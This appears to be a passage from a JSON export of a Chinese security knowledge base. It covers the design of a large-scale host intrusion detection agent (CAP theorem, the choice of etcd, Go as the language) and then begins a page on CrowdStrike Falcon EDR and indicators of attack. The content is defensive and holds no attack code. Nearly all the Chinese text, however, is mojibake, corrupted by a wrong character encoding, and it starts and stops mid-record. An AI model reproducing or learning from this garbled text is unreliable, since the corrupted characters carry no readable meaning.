Agentæ’ä»¶å…·å¤‡è‡ªæ›´æ–°åŠŸèƒ½ã€‚\r\n\r\n# 4. åˆ†æéœ€æ±‚\r\n  - é¦–å…ˆï¼ŒæœåŠ¡å™¨ä¸šåŠ¡è¿›ç¨‹ä¼˜å…ˆçº§é«˜ï¼ŒHIDS Agentè¿›ç¨‹è‡ªå·±å¯ä»¥ç»ˆæ­¢ï¼Œä½†ä¸èƒ½å½±å“å®¿ä¸»æœºçš„ä¸»è¦ä¸šåŠ¡ï¼Œè¿™æ˜¯ç¬¬ä¸€è¦ç‚¹ï¼Œé‚£ä¹ˆä¸šåŠ¡éœ€è¦å…·å¤‡ç†”æ–­åŠŸèƒ½ï¼Œå¹¶å…·å¤‡è‡ªæˆ‘æ¢å¤èƒ½åŠ›ã€‚\r\n  - å…¶æ¬¡ï¼Œè¿›ç¨‹ä¿æ´»ã€ç»´æŒå¿ƒè·³ã€å®æ—¶è·å–æ–°æŒ‡ä»¤èƒ½åŠ›ï¼Œç™¾ä¸‡å°Agentçš„å…¨é‡æ§åˆ¶æ—¶é—´ä¸€å®šè¦çŸ­ã€‚ä¸¾ä¸ªæç«¯çš„ä¾‹å­ï¼Œå½“Agentå‡ºç°ç´§æ€¥æƒ…å†µï¼Œéœ€è¦å…¨é‡åœæ­¢æ—¶ï¼Œé‚£ä¹ˆå…¨é‡åœæ­¢çš„å‘½ä»¤ä¸‹å‘ï¼Œéœ€è¦åœ¨1-2åˆ†é’Ÿå†…å®Œæˆï¼Œç”šè‡³30ç§’ã€20ç§’å†…å®Œæˆã€‚è¿™äº›å°†ä¼šæ˜¯å¾ˆå¤§çš„æŠ€æœ¯æŒ‘æˆ˜ã€‚\r\n  - è¿˜æœ‰å¯¹é…ç½®åŠ¨æ€æ›´æ–°ï¼Œæ—¥å¿—çº§åˆ«æ§åˆ¶ï¼Œç»†åˆ†ç²¾ç¡®æ§åˆ¶åˆ°æ¯ä¸ªAgentä¸Šçš„æ¯ä¸ªHIDSå­è¿›ç¨‹ï¼Œèƒ½è‡ªç”±åœ°æ§åˆ¶æ¯ä¸ªè¿›ç¨‹çš„å¯åœï¼Œæ¯ä¸ªAgentçš„å‚æ•°ï¼Œä¹Ÿèƒ½ç²¾ç¡®çš„æ„ŸçŸ¥æ¯å°Agentçš„ä¸Šçº¿ã€ä¸‹çº¿æƒ…å†µã€‚\r\n  - åŒæ—¶ï¼ŒAgentæœ¬èº«æ˜¯å®‰å…¨Agentï¼Œå®‰å…¨çš„å› ç´ ä¹Ÿè¦è€ƒè™‘è¿›å»ï¼ŒåŒ…æ‹¬é€šä¿¡é€šé“çš„å®‰å…¨æ€§ï¼Œé…ç½®ç®¡ç†çš„å®‰å…¨æ€§ç­‰ç­‰ã€‚\r\n  - æœ€åï¼ŒæœåŠ¡ç«¯ä¹Ÿè¦æœ‰ä¸€è‡´æ€§ä¿éšœã€å¯ç”¨æ€§ä¿éšœï¼Œå¯¹äºå¤§é‡Agentçš„ç®¡ç†ï¼Œå¿…é¡»èƒ½å®ç°ä»»åŠ¡åˆ†æ‘Šï¼Œå¹¶è¡Œå¤„ç†ä»»åŠ¡ï¼Œä¸”ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚è€ƒè™‘åˆ°å…¬å¸è§„æ¨¡ä¸æ–­åœ°æ‰©å¤§ï¼Œä¸šåŠ¡ä¸æ–­åœ°å¢å¤šï¼Œç‰¹åˆ«æ˜¯ç¾å›¢å’Œå¤§ä¼—ç‚¹è¯„åˆå¹¶åï¼Œé¢å¯¹çš„å„ç§æ“ä½œç³»ç»Ÿé—®é¢˜ï¼Œäº§å“è¿˜è¦å…·å¤‡è‰¯å¥½çš„å…¼å®¹æ€§ã€å¯ç»´æŠ¤æ€§ç­‰ã€‚\r\n  - æ€»ç»“ä¸‹æ¥ï¼Œäº§å“æ¶æ„è¦ç¬¦åˆä»¥ä¸‹ç‰¹æ€§ï¼š\r\n    - é›†ç¾¤é«˜å¯ç”¨ã€‚\r\n    - åˆ†å¸ƒå¼ï¼Œå»ä¸­å¿ƒåŒ–ã€‚\r\n    - é…ç½®ä¸€è‡´æ€§ï¼Œé…ç½®å¤šç‰ˆæœ¬å¯è¿½æº¯ã€‚\r\n    - åˆ†æ²»ä¸æ±‡æ€»ã€‚\r\n    - å…¼å®¹éƒ¨ç½²å„ç§Linux æœåŠ¡å™¨ï¼Œåªç»´æŠ¤ä¸€ä¸ªç‰ˆæœ¬ã€‚\r\n    - èŠ‚çœèµ„æºï¼Œå ç”¨è¾ƒå°‘çš„CPUã€å†…å­˜ã€‚\r\n    - ç²¾ç¡®çš„ç†”æ–­é™æµã€‚\r\n    - æœåŠ¡å™¨æ•°é‡è§„æ¨¡è¾¾åˆ°ç™¾ä¸‡çº§çš„é›†ç¾¤è´Ÿè½½èƒ½åŠ›ã€‚\r\n\r\n# 5. æŠ€æœ¯éš¾ç‚¹ï¼š\r\nåœ¨åˆ—å‡ºäº§å“éœ€è¦å®ç°çš„åŠŸèƒ½ç‚¹ã€æŠ€æœ¯ç‚¹åï¼Œå†æ¥åˆ†æä¸‹é‡åˆ°çš„æŠ€æœ¯æŒ‘æˆ˜ï¼ŒåŒ…æ‹¬ä¸é™äºä»¥ä¸‹å‡ ç‚¹ï¼š\r\n\r\n- èµ„æºé™åˆ¶ï¼Œè¾ƒå°çš„CPUã€å†…å­˜ã€‚\r\n- äº”åä¸‡ç”šè‡³ä¸€ç™¾ä¸‡å°æœåŠ¡å™¨çš„Agentå¤„ç†æ§åˆ¶é—®é¢˜ã€‚\r\n- é‡çº§å¤§äº†åï¼Œé›†ç¾¤æ§åˆ¶å¸¦æ¥çš„æ§åˆ¶æ•ˆç‡ï¼Œå“åº”å»¶è¿Ÿï¼Œæ•°æ®ä¸€è‡´æ€§é—®é¢˜ã€‚\r\n- é‡çº§å¤§äº†åï¼Œæ•°æ®ä¼ è¾“å¯¹æ•´ä¸ªæœåŠ¡å™¨å†…ç½‘å¸¦æ¥çš„æµé‡å†²å‡»é—®é¢˜ã€‚\r\n- é‡çº§å¤§äº†åï¼Œè¿è¡Œç¯å¢ƒæ›´å¤æ‚ï¼ŒAgentå¼‚å¸¸è¡¨ç°çš„æ„ŸçŸ¥é—®é¢˜ã€‚\r\n- é‡çº§å¤§äº†åï¼Œä¸šåŠ¡æ—¥å¿—ã€ç¨‹åºè¿è¡Œæ—¥å¿—çš„ä¼ è¾“ã€å­˜å‚¨é—®é¢˜ï¼Œè¢«ç›‘æ§ä¸šåŠ¡è®¿é—®é‡çªå¢å¸¦æ¥ç›‘æ§æ•°æ®è”çªå¢ï¼Œå¯¹å†…ç½‘å¸¦å®½ï¼Œå­˜å‚¨é›†ç¾¤çš„çˆ†å‘å‹åŠ›é—®é¢˜ã€‚\r\n\r\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæŠ€æœ¯éš¾ç‚¹å‡ ä¹éƒ½æ˜¯æœåŠ¡å™¨åˆ°è¾¾ä¸€å®šé‡çº§å¸¦æ¥çš„ï¼Œå¯¹äºå¤§é‡çš„æœåŠ¡ï¼Œé›†ç¾¤åˆ†å¸ƒå¼æ˜¯ä¸šç•Œå¸¸è§çš„è§£å†³æ–¹æ¡ˆã€‚\r\n\r\n# 6. æ¶æ„è®¾è®¡ä¸æŠ€æœ¯é€‰å‹\r\nå¯¹äºç®¡ç†Agentçš„æœåŠ¡ç«¯æ¥è¯´ï¼Œè¦å®ç°é«˜å¯ç”¨ã€å®¹ç¾è®¾è®¡ï¼Œé‚£ä¹ˆä¸€å®šè¦åšå¤šæœºæˆ¿éƒ¨ç½²ï¼Œå°±ä¸€å®šä¼šé‡åˆ°æ•°æ®ä¸€è‡´æ€§é—®é¢˜ã€‚é‚£ä¹ˆæ•°æ®çš„å­˜å‚¨ï¼Œå°±è¦è€ƒè™‘åˆ†å¸ƒå¼å­˜å‚¨ç»„ä»¶ã€‚ åˆ†å¸ƒå¼æ•°æ®å­˜å‚¨ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªå®šç†å«`CAPå®šç†`ï¼š\r\n\r\n![lxjgAk](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/lxjgAk.jpg)\r\n\r\n**CAPçš„è§£é‡Š**:\r\n- å…³äº`CAPå®šç†`ï¼Œåˆ†ä¸ºä»¥ä¸‹ä¸‰ç‚¹ï¼š\r\n  - ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼šåˆ†å¸ƒå¼æ•°æ®åº“çš„æ•°æ®ä¿æŒä¸€è‡´ã€‚\r\n  - å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰ï¼šä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹å®•æœºï¼Œå…¶ä»–èŠ‚ç‚¹å¯ä»¥ç»§ç»­å¯¹å¤–æä¾›æœåŠ¡ã€‚\r\n  - åˆ†åŒºå®¹é”™æ€§ï¼ˆç½‘ç»œåˆ†åŒºï¼‰Partition Toleranceï¼šä¸€ä¸ªæ•°æ®åº“æ‰€åœ¨çš„æœºå™¨åäº†ï¼Œå¦‚ç¡¬ç›˜åäº†ï¼Œæ•°æ®ä¸¢å¤±äº†ï¼Œå¯ä»¥æ·»åŠ ä¸€å°æœºå™¨ï¼Œç„¶åä»å…¶ä»–æ­£å¸¸çš„æœºå™¨æŠŠå¤‡ä»½çš„æ•°æ®åŒæ­¥è¿‡æ¥ã€‚\r\n- æ ¹æ®å®šç†ï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿåªèƒ½æ»¡è¶³ä¸‰é¡¹ä¸­çš„ä¸¤é¡¹è€Œä¸å¯èƒ½æ»¡è¶³å…¨éƒ¨ä¸‰é¡¹ã€‚ç†è§£CAPå®šç†çš„æœ€ç®€å•æ–¹å¼æ˜¯æƒ³è±¡ä¸¤ä¸ªèŠ‚ç‚¹åˆ†å¤„åˆ†åŒºä¸¤ä¾§ã€‚å…è®¸è‡³å°‘ä¸€ä¸ªèŠ‚ç‚¹æ›´æ–°çŠ¶æ€ä¼šå¯¼è‡´æ•°æ®ä¸ä¸€è‡´ï¼Œå³ä¸§å¤±äº†Consistencyã€‚å¦‚æœä¸ºäº†ä¿è¯æ•°æ®ä¸€è‡´æ€§ï¼Œå°†åˆ†åŒºä¸€ä¾§çš„èŠ‚ç‚¹è®¾ç½®ä¸ºä¸å¯ç”¨ï¼Œé‚£ä¹ˆåˆä¸§å¤±äº†Availabilityã€‚é™¤éä¸¤ä¸ªèŠ‚ç‚¹å¯ä»¥äº’ç›¸é€šä¿¡ï¼Œæ‰èƒ½æ—¢ä¿è¯Consistencyåˆä¿è¯Availabilityï¼Œè¿™åˆä¼šå¯¼è‡´ä¸§å¤±Partition Toleranceã€‚\r\n- å‚è§ï¼š[CAP Theorem](https://en.wikipedia.org/wiki/CAP_theorem)\r\n\r\n**CAPçš„é€‰æ‹©**:\r\n- ä¸ºäº†å®¹ç¾ä¸Šè®¾è®¡ï¼Œé›†ç¾¤èŠ‚ç‚¹çš„éƒ¨ç½²ï¼Œä¼šé€‰æ‹©çš„å¼‚åœ°å¤šæœºæˆ¿ï¼Œæ‰€ä»¥ ã€ŒPartition toleranceã€æ˜¯ä¸å¯èƒ½é¿å…çš„ã€‚é‚£ä¹ˆå¯é€‰çš„æ˜¯ `AP` ä¸ `CP`ã€‚\r\n- åœ¨HIDSé›†ç¾¤çš„åœºæ™¯é‡Œï¼Œå„ä¸ªAgentå¯¹é›†ç¾¤æŒç»­å¯ç”¨æ€§æ²¡æœ‰éå¸¸å¼ºçš„è¦æ±‚ï¼Œåœ¨çŸ­æš‚æ—¶é—´å†…ï¼Œæ˜¯å¯ä»¥å‡ºç°å¼‚å¸¸ï¼Œå‡ºç°æ— æ³•é€šè®¯çš„æƒ…å†µã€‚ä½†æœ€ç»ˆçŠ¶æ€å¿…é¡»è¦ä¸€è‡´ï¼Œä¸èƒ½å­˜åœ¨é›†ç¾¤ä¸‹å‘å…³åœæŒ‡ä»¤ï¼Œè€Œå‡ºç°ä¸ªåˆ«Agentä¸å¬ä»é›†ç¾¤æ§åˆ¶çš„æƒ…å†µå‡ºç°ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ»¡è¶³ `CP` çš„äº§å“ã€‚\r\n\r\n# 7. æ»¡è¶³CPçš„äº§å“é€‰æ‹©\r\n  - åœ¨å¼€æºç¤¾åŒºä¸­ï¼Œæ¯”è¾ƒå‡ºåçš„å‡ æ¬¾æ»¡è¶³CPçš„äº§å“ï¼Œæ¯”å¦‚etcdã€ZooKeeperã€Consulç­‰ã€‚æˆ‘ä»¬éœ€è¦æ ¹æ®å‡ æ¬¾äº§å“çš„ç‰¹ç‚¹ï¼Œæ ¹æ®æˆ‘ä»¬éœ€æ±‚æ¥é€‰æ‹©ç¬¦åˆæˆ‘ä»¬éœ€æ±‚çš„äº§å“ã€‚\r\n  - æ’ä¸€å¥ï¼Œç½‘ä¸Šå¾ˆå¤šäººè¯´Consulæ˜¯APäº§å“ï¼Œè¿™æ˜¯ä¸ªé”™è¯¯çš„æè¿°ã€‚æ—¢ç„¶Consulæ”¯æŒåˆ†å¸ƒå¼éƒ¨ç½²ï¼Œé‚£ä¹ˆä¸€å®šä¼šå‡ºç°ã€Œç½‘ç»œåˆ†åŒºã€çš„é—®é¢˜ï¼Œ é‚£ä¹ˆä¸€å®šè¦æ”¯æŒã€ŒPartition toleranceã€ã€‚å¦å¤–ï¼Œåœ¨consulçš„å®˜ç½‘ä¸Šè‡ªå·±ä¹Ÿæåˆ°äº†è¿™ç‚¹ Consul uses a CP architecture, favoring consistency over availability.\r\n  \r\n    > Consul is opinionated in its usage while Serf is a more flexible and general purpose tool. In CAP terms, Consul uses a CP architecture, favoring consistency over availability. Serf is an AP system and sacrifices consistency for availability. This means Consul cannot operate if the central servers cannot form a quorum while Serf will continue to function under almost all circumstances.\r\n\r\n  - **etcdã€ZooKeeperã€Consulå¯¹æ¯”**\r\n\r\n    - å€Ÿç”¨etcdå®˜ç½‘ä¸Šetcdä¸ZooKeeperå’ŒConsulçš„æ¯”è¾ƒå›¾ã€‚\r\n    - ![XotcyC](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/XotcyC.jpg)\r\n    - åœ¨æˆ‘ä»¬HIDS Agentçš„éœ€æ±‚ä¸­ï¼Œé™¤äº†åŸºæœ¬çš„`æœåŠ¡å‘ç°` ã€`é…ç½®åŒæ­¥` ã€`é…ç½®å¤šç‰ˆæœ¬æ§åˆ¶` ã€`å˜æ›´é€šçŸ¥`ç­‰åŸºæœ¬éœ€æ±‚å¤–ï¼Œæˆ‘ä»¬è¿˜æœ‰åŸºäºäº§å“å®‰å…¨æ€§ä¸Šçš„è€ƒè™‘ï¼Œæ¯”å¦‚`ä¼ è¾“é€šé“åŠ å¯†`ã€`ç”¨æˆ·æƒé™æ§åˆ¶`ã€`è§’è‰²ç®¡ç†`ã€`åŸºäºKeyçš„æƒé™è®¾å®š`ç­‰ï¼Œè¿™ç‚¹ `etcd` æ¯”è¾ƒç¬¦åˆæˆ‘ä»¬è¦æ±‚ã€‚å¾ˆå¤šå¤§å‹å…¬å¸éƒ½åœ¨ä½¿ç”¨ï¼Œæ¯”å¦‚`Kubernetes`ã€`AWS`ã€`OpenStack`ã€`Azure`ã€`Google Cloud`ã€`Huawei Cloud`ç­‰ï¼Œå¹¶ä¸”`etcd`çš„ç¤¾åŒºæ”¯æŒéå¸¸å¥½ã€‚åŸºäºè¿™å‡ ç‚¹å› ç´ ï¼Œæˆ‘ä»¬é€‰æ‹©etcdä½œä¸ºHIDSçš„åˆ†å¸ƒå¼é›†ç¾¤ç®¡ç†ã€‚\r\n\r\n# 8. åˆ†å¸ƒå¼HIDSé›†ç¾¤æ¶æ„å›¾\r\n![c09vZx](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/c09vZx.jpg)\r\n\r\n# 9. ç¼–ç¨‹è¯­è¨€é€‰æ‹©\r\nè€ƒè™‘åˆ°å…¬å¸æœåŠ¡å™¨é‡å¤§ï¼Œä¸šåŠ¡å¤æ‚ï¼Œéœ€æ±‚ç¯å¢ƒå¤šå˜ï¼Œæ“ä½œç³»ç»Ÿå¯èƒ½åŒ…æ‹¬å„ç§Linuxä»¥åŠWindowsç­‰ã€‚ä¸ºäº†ä¿è¯ç³»ç»Ÿçš„å…¼å®¹æ€§ï¼Œæˆ‘ä»¬é€‰æ‹©äº†Golangä½œä¸ºå¼€å‘è¯­è¨€ï¼Œå®ƒå…·å¤‡ä»¥ä¸‹ç‰¹ç‚¹ï¼š\r\n\r\n- å¯ä»¥é™æ€ç¼–è¯‘ï¼Œç›´æ¥é€šè¿‡syscallæ¥è¿è¡Œï¼Œä¸ä¾èµ–libcï¼Œå…¼å®¹æ€§é«˜ï¼Œå¯ä»¥åœ¨æ‰€æœ‰Linuxä¸Šæ‰§è¡Œï¼Œéƒ¨ç½²ä¾¿æ·ã€‚\r\n- é™æ€ç¼–è¯‘è¯­è¨€ï¼Œèƒ½å°†ç®€å•çš„é”™è¯¯åœ¨ç¼–è¯‘å‰å°±å‘ç°ã€‚\r\n- å…·å¤‡è‰¯å¥½çš„GCæœºåˆ¶ï¼Œå ç”¨ç³»ç»Ÿèµ„æºå°‘ï¼Œå¼€å‘æˆæœ¬ä½ã€‚\r\n- å®¹å™¨åŒ–çš„å¾ˆå¤šäº§å“éƒ½æ˜¯Golangç¼–å†™ï¼Œæ¯”å¦‚Kubernetesã€Dockerç­‰ã€‚\r\n- etcdé¡¹ç›®ä¹Ÿæ˜¯Golangç¼–å†™ï¼Œç±»åº“ã€æµ‹è¯•ç”¨ä¾‹å¯ä»¥ç›´æ¥ç”¨ï¼ŒSDKæ”¯æŒå¿«é€Ÿã€‚\r\n- è‰¯å¥½çš„CSPå¹¶å‘æ¨¡å‹æ”¯æŒï¼Œé«˜æ•ˆçš„åç¨‹è°ƒåº¦æœºåˆ¶ã€‚\r\n\r\n# 10. äº§å“æ¶æ„å¤§æ–¹å‘\r\n  - HIDSäº§å“ç ”å‘å®Œæˆåï¼Œéƒ¨ç½²çš„æœåŠ¡éƒ½è¿è¡Œç€å„ç§ä¸šåŠ¡çš„æœåŠ¡å™¨ï¼Œä¸šåŠ¡çš„é‡è¦æ€§æ’åœ¨ç¬¬ä¸€ï¼Œæˆ‘ä»¬äº§å“çš„åŠŸèƒ½æ’åœ¨åé¢ã€‚ä¸ºæ­¤ï¼Œç¡®å®šäº†å‡ ä¸ªäº§å“çš„å¤§æ–¹å‘ï¼š\r\n    - é«˜å¯ç”¨ï¼Œæ•°æ®ä¸€è‡´ï¼Œå¯æ¨ªå‘æ‰©å±•ã€‚\r\n    - å®¹ç¾æ€§å¥½ï¼Œèƒ½åº”å¯¹æœºæˆ¿çº§çš„ç½‘ç»œæ•…éšœã€‚\r\n    - å…¼å®¹æ€§å¥½ï¼Œåªç»´æŠ¤ä¸€ä¸ªç‰ˆæœ¬çš„Agentã€‚\r\n    - ä¾èµ–ä½ï¼Œä¸ä¾èµ–ä»»ä½•åŠ¨æ€é“¾æ¥åº“ã€‚\r\n    - ä¾µå…¥æ€§ä½ï¼Œä¸åšHookï¼Œä¸åšç³»ç»Ÿç±»åº“æ›´æ”¹ã€‚\r\n    - ç†”æ–­é™çº§å¯é ï¼Œå®å¯è‡ªå·±æŒ‚æ‰ï¼Œä¹Ÿä¸å½±å“ä¸šåŠ¡ ã€‚\r\n\r\n# 11. æ¡†æ¶è®¾è®¡\r\n![XMnpix](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/XMnpix.jpg)\r\n\r\nå¦‚ä¸Šå›¾ï¼Œåœ¨æ¡†æ¶çš„è®¾è®¡ä¸Šï¼Œå°è£…å¸¸ç”¨ç±»åº“ï¼ŒæŠ½è±¡åŒ–å®šä¹‰`Interface`ï¼Œå‰¥ç¦»`etcd Client`ï¼Œå…¨å±€åŒ–`Logger`ï¼ŒæŠ½è±¡åŒ–Appçš„å¯åŠ¨ã€é€€å‡ºæ–¹æ³•ã€‚ä½¿å¾—å„`æ¨¡å—`ï¼ˆä»¥ä¸‹ç®€ç§°`App`ï¼‰åªéœ€è¦å®ç°è‡ªå·±çš„ä¸šåŠ¡å³å¯ï¼Œå¯ä»¥æ–¹ä¾¿å¿«æ·çš„è¿›è¡Œé€»è¾‘ç¼–å†™ï¼Œæ— éœ€å…³å¿ƒåº•å±‚å®ç°ã€é…ç½®æ¥æºã€é‡è¯•æ¬¡æ•°ã€ç†”æ–­æ–¹æ¡ˆç­‰ç­‰ã€‚\r\n\r\nåé¢ä¸å†copyï¼Œæ„Ÿå…´è¶£è¯·å‚è€ƒåŸæ–‡"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue TeamåŸºç¡€è®¾æ–½/ç»ˆç«¯åŸºç¡€è®¾æ–½/EDRå•†ä¸šåŒ–äº§å“/CrowdStrike Falcon/","title":"CrowdStrike Falcon"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: CrowdStrike Falcon\r\ntags:\r\n- Blue TeamåŸºç¡€è®¾æ–½\r\n- ç»ˆç«¯åŸºç¡€è®¾æ–½\r\n- EDRå•†ä¸šåŒ–äº§å“\r\n- CrowdStrike\r\n---\r\n\r\n# 1. CrowdStrike EDR è§£å†³æ–¹æ¡ˆä¸­æœ€é‡è¦çš„æ˜¯ä»€ä¹ˆï¼Ÿ\r\n![NsTQNy](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/NsTQNy.jpg)\r\n\r\n- **æ‰¾åˆ°èƒ½å¤Ÿæä¾›æœ€é«˜çº§åˆ«çš„ä¿æŠ¤åŒæ—¶éœ€è¦æœ€å°‘çš„åŠªåŠ›å’ŒæŠ•èµ„çš„ EDR å®‰å…¨è§£å†³æ–¹æ¡ˆéå¸¸é‡è¦**â€”â€”åœ¨ä¸è€—å°½èµ„æºçš„æƒ…å†µä¸‹ä¸ºæ‚¨çš„å®‰å…¨å›¢é˜Ÿå¢åŠ ä»·å€¼ã€‚ä»¥ä¸‹æ˜¯æ‚¨åº”è¯¥å¯»æ‰¾çš„ EDR çš„å…­ä¸ªå…³é”®æ–¹é¢ï¼š\r\n\r\n  - **å¯è§åº¦ï¼š**è·¨æ‰€æœ‰ç»ˆç«¯çš„å®æ—¶å¯è§æ€§ï¼Œä»è€Œå¯ä»¥æ£€æµ‹å‘ç°æ”»å‡»è€…æ´»åŠ¨ï¼Œè¿›è€Œå®æ–½é˜»æ–­ã€‚\r\n  - **å¨èƒæ•°æ®åº“ï¼š**EDR éœ€è¦ä»ç»ˆç«¯æ”¶é›†å¤§é‡é¥æµ‹æ•°æ®å¹¶ä¸°å¯Œä¸Šä¸‹æ–‡ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨å„ç§åˆ†ææŠ€æœ¯æŒ–æ˜æ”»å‡»è¿¹è±¡ã€‚\r\n  - **è¡Œä¸ºä¿æŠ¤ï¼š**ä»…ä¾èµ–åŸºäºç­¾åæˆ–IOCä¼šå¯¼è‡´æ£€æµ‹èƒ½åŠ›è¢«è½»æ˜“ç»•è¿‡ï¼Œä»è€Œå¯¼è‡´æ•°æ®æ³„éœ²ï¼›EDRéœ€è¦èƒ½é€šè¿‡è¡Œä¸ºæ¥æœç´¢æ”»å‡»æŒ‡æ ‡ (IOAsï¼Œcrowdstrikeå‘æ˜çš„)ï¼Œä»¥ä¾¿åœ¨å‘ç”Ÿå±å®³ä¹‹å‰æ”¶åˆ°å¯ç–‘æ´»åŠ¨çš„å‘Šè­¦ã€‚\r\n\r\n- TODO > ä»€ä¹ˆæ˜¯æ”»å‡»æŒ‡æ ‡ Indicators of attack (IOA)ï¼Ÿ\r\n  æ”»å‡»æŒ‡æ ‡ (IOA)ä¾§é‡äºæ£€æµ‹æ”»å‡»è€…è¯•å›¾å®Œæˆçš„ç›®æ ‡çš„æ„å›¾ï¼Œè€Œä¸ç®¡æ”»å‡»ä¸­ä½¿ç”¨çš„æ¶æ„è½¯ä»¶æˆ–æ¼æ´ã€‚å°±åƒæ€æ¯’è½¯ä»¶çš„ç­¾åä¸€æ ·ï¼ŒåŸºäº IOC çš„æ£€æµ‹æ–¹æ³•æ— æ³•æ£€æµ‹åˆ°0dayæ”»å‡»å’Œå…æ€æ¶æ„è½¯ä»¶ã€‚\r\n\r\n  >æ¯”å¦‚é±¼å‰æ”»å‡»ï¼Œå¿…é¡»æ¬ºéª—ç›®æ ‡ç‚¹å‡»é“¾æ¥æˆ–æ‰“å¼€æ¶æ„æ–‡ä»¶/æ–‡æ¡£ï¼Œä¸€æ—¦æœºå™¨æ²¦é™·ï¼Œæ”»å‡»è€…å°†é»˜é»˜åœ°æ‰§è¡Œå¦ä¸€ä¸ªè¿›ç¨‹ï¼Œéšè—åœ¨å†…å­˜æˆ–ç£ç›˜ä¸­ï¼Œå¹¶åœ¨ç³»ç»Ÿé‡æ–°å¯åŠ¨åç»´æŒæƒé™ï¼›ç„¶åä¸C2è”ç³»ï¼Œç­‰å¾…è¿›ä¸€æ­¥çš„æŒ‡ç¤ºã€‚\r\n  >\r\n  >IOA å…³æ³¨è¿™äº›å…·ä½“æ­¥éª¤çš„æ‰§è¡Œã€å¯¹æ‰‹çš„æ„å›¾ä»¥åŠä»–è¯•å›¾å®ç°çš„ç»“æœã€‚IOAå¹¶ä¸å…³æ³¨ä»–ç”¨æ¥å®ç°ç›®æ ‡çš„ç‰¹å®šå·¥å…·ï¼Œè€Œå®ç›‘æ§å…³é”®è¡ŒåŠ¨ï¼Œé€šè¿‡æœ‰çŠ¶æ€æ‰§è¡Œæ£€æŸ¥å¼•æ“(Stateful Execution Inspection Engine)æ¥æ”¶é›†å’Œä½¿ç”¨æŒ‡æ ‡(indicators )ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šæ”»å‡»è€…å¦‚ä½•æˆåŠŸè®¿é—®ç½‘ç»œå¹¶æ¨æ–­å…¶æ„å›¾ã€‚\r\n\r\n  - **æ´å¯ŸåŠ›å’Œæ™ºæ…§ï¼š**é›†æˆå¨èƒæƒ…æŠ¥çš„EDRè§£å†³æ–¹æ¡ˆå¯ä»¥æä¾›ä¸Šä¸‹æ–‡ï¼ŒåŒ…æ‹¬æ”»å‡»æ‚¨çš„ç‰¹å®šå¯¹æ‰‹çš„è¯¦ç»†ä¿¡æ¯æˆ–æœ‰å…³æ”»å‡»çš„å…¶ä»–ä¿¡æ¯ã€‚\r\n  - **å¿«é€Ÿå“åº”ï¼š**EDRèƒ½å¤Ÿå¯¹äº‹ä»¶åšå‡ºå¿«é€Ÿå‡†ç¡®çš„å“åº”ï¼Œå¯ä»¥åœ¨æ”»å‡»é€ æˆå½±å“ä¹‹å‰é˜»æ­¢æ”»å‡»ï¼Œå¹¶å¿«é€Ÿæ¢å¤ä¸šåŠ¡ã€‚\r\n  - **åŸºäºäº‘ï¼š**åŸºäºäº‘çš„EDRè§£å†³æ–¹æ¡ˆå¯ä»¥é™ä½å¯¹ç»ˆç«¯çš„å½±å“ï¼ŒåŒæ—¶ç¡®ä¿å¯ä»¥å‡†ç¡®ã€å®æ—¶åœ°å®Œæˆæœç´¢ã€åˆ†æå’Œè°ƒæŸ¥ç­‰åŠŸèƒ½ã€‚\r\n\r\n# 2. CrowdStrike EDR æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ\r\n- EDRè§£å†³æ–¹æ¡ˆçš„å·¥ä½œåŸç†æ˜¯æä¾›å¯¹ç»ˆç«¯ä¸Šå‘ç”Ÿäº‹æƒ…çš„æŒç»­å’Œå…¨é¢çš„å®æ—¶æ£€æµ‹/ç›‘æ§ã€‚ç„¶åå°†è¡Œä¸ºåˆ†æå’Œå¯æ“ä½œçš„æƒ…æŠ¥åº”ç”¨äºç»ˆç«¯æ•°æ®ï¼Œä»¥é˜»æ­¢æ”»å‡»å‘Šè­¦æ¼”å˜ä¸ºå®‰å…¨äº‹ä»¶ã€‚åŠŸèƒ½åŒ…æ‹¬ï¼š\r\n  - **1. è‡ªåŠ¨å‘ç°æœªçŸ¥æ”»å‡»è€…**\r\n    - Falcon Insight å°†æ‰€æœ‰ç»ˆç«¯çš„é¥æµ‹æ•°æ®ä¸IOAé…å¯¹ï¼Œå¹¶ä½¿ç”¨å…¶è¡Œä¸ºæ¥åˆ†ææ•°åäº¿äº‹ä»¶ï¼Œè‡ªåŠ¨æ£€æµ‹å¯ç–‘è¡Œä¸ºçš„ç—•è¿¹ï¼›å¦‚æœä¸€ç³»åˆ—äº‹ä»¶å’Œå‘Šè­¦ä¸å·²çŸ¥ IOAåŒ¹é…ï¼Œagentå°†æŠŠè¯¥æ´»åŠ¨æ ‡è®°ä¸ºæ¶æ„å¹¶è‡ªåŠ¨å‘é€å‘Šè­¦ï¼›ç”¨æˆ·è¿˜å¯ä»¥ç¼–å†™è‡ªå·±çš„æœç´¢æ¡ä»¶ï¼ŒFalcon Insightçš„äº‘æ¶æ„å¯åœ¨5 ç§’æˆ–æ›´çŸ­çš„æ—¶é—´å†…è¿”å›æŸ¥è¯¢ç»“æœã€‚\r\n  - **2. ä¸å¨èƒæƒ…æŠ¥é›†æˆ**\r\n    - å¯ä»¥æ›´å¿«åœ°æ£€æµ‹è¢«è¯†åˆ«ä¸ºæ¶æ„çš„TTPsï¼Œå¹¶æä¾›äº†ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬ç›¸å…³çš„å½’å› 